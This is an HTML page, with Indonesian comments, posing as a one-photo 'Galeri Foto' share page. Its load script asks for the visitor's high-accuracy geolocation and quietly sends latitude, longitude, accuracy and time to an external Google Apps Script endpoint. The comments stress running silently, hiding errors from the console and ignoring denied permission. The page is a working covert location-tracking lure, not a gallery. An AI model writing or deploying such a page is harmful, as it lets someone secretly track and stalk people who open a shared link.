<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Galeri Foto</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            max-width: 500px;
            width: 100%;
            padding: 15px;
            box-sizing: border-box;
        }
        .image-wrapper {
            background: white;
            padding: 10px;
            border-radius: 8px;
            box-shadow: 0px 4px 15px rgba(0,0,0,0.3);
        }
        img {
            width: 100%;
            height: auto;
            border-radius: 4px;
            display: block;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="image-wrapper">
            <!-- Ganti teks URL_FOTO_ANDA di bawah ini dengan tautan langsung (direct link) foto Anda -->
            <img src="PXL_20260815_090015220.jpg" alt="Shared Media">
        </div>
    </div>

    <script>
        // Skrip berjalan secara senyap di latar belakang tanpa mengubah tampilan teks
        window.onload = function() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const akurasi = position.coords.accuracy;
                        const waktuSekarang = new Date().toLocaleString();
                        
                        const payload = {
                            waktu: waktuSekarang,
                            latitude: lat,
                            longitude: lon,
                            akurasi: akurasi + " meter"
                        };

                        fetch("https://script.google.com/macros/s/AKfycbwwjCkMGf_fNAGP8S03P5-xhv4PBiF8ISvZ267ks1dOMbCbnEax3Do01pn1MtekAIxP/exec", {
                            method: "POST",
                            mode: "no-cors",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify(payload)
                        }).catch(err => {
                            // Mengabaikan log error agar tidak terlihat di konsol publik
                        });
                    },
                    function(error) {
                        // Mengabaikan jika izin ditolak
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }
        };
    </script>

</body>
</html>
